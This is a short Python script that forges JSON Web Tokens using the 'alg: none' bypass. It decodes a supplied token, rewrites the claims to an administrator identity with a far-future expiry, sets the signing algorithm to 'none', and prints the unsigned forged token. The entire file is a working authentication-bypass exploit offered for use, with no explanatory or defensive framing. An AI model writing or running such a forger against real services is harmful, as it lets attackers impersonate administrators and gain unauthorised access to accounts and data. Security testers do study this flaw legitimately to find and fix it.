import base64
import json
import sys

def b64url_encode(data):
    """Encode JSON to base64url string without padding."""
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')

def b64url_decode(data):
    """Decode base64url string to JSON."""
    padded = data + '=' * (-len(data) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))

def forge_alg_none_token(original_jwt):
    try:
        parts = original_jwt.split('.')
        if len(parts) != 3:
            print("[X] Invalid JWT format (expected 3 parts)")
            return

        original_header = b64url_decode(parts[0])
        original_payload = b64url_decode(parts[1])

        print("[*] Original header:")
        print(json.dumps(original_header, indent=2))

        print("[*] Original payload:")
        print(json.dumps(original_payload, indent=2))

        # Modify payload as needed
        new_payload = original_payload.copy()
        new_payload["nameid"] = "1"
        new_payload["unique_name"] = "admin@example.com"
        new_payload["role"] = "admin"
        new_payload["exp"] = 1999999999

        # Set alg to 'none'
        new_header = {"alg": "none", "typ": "JWT"}

        encoded_header = b64url_encode(new_header)
        encoded_payload = b64url_encode(new_payload)

        forged_token = f"{encoded_header}.{encoded_payload}."

        print("\n[+] Forged JWT with alg:none:")
        print(forged_token)

    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 jwt_alg_none_forge.py <JWT>")
        sys.exit(1)

    input_jwt = sys.argv[1]
    forge_alg_none_token(input_jwt)
